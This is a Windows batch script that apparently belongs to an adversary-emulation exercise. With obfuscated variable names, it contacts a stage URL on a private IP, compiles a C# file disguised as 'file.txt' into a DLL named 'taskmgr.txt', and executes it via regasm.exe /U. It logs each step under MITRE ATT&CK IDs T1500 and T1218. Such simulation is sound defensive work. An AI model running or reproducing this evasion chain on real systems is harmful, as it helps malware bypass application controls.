@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9226\b0706f2d
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9226-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=taskmgr.txt
SET njozco=file.txt
SET kkjwr=9226
SET logp=%APPDATA%\!ufeybybm!\macula-simulations.log
SET cdf=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start>> "!logp!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=1>> "!logp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start>> "!logp!" 2>nul
cd /d "!recnn!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete=!errorlevel!>> "!logp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start>> "!logp!" 2>nul
csc /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
SET compres=0
IF EXIST "!hpnjatpj!" SET compres=1
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!compres!>> "!logp!" 2>nul

SET t1res=0&SET t1err=
IF !compres!==1 SET t1res=1
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!t1res!:!t1err!>> "!logp!" 2>nul

IF !compres!==0 exit /b 1

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_start>> "!logp!" 2>nul
"!cdf!\regasm.exe" /U "!hpnjatpj!" >nul 2>&1
SET execres=!errorlevel!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: regasm_complete=!execres!>> "!logp!" 2>nul

SET t2res=0&SET t2err=
IF !execres!==0 SET t2res=1
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!t2res!:!t2err!>> "!logp!" 2>nul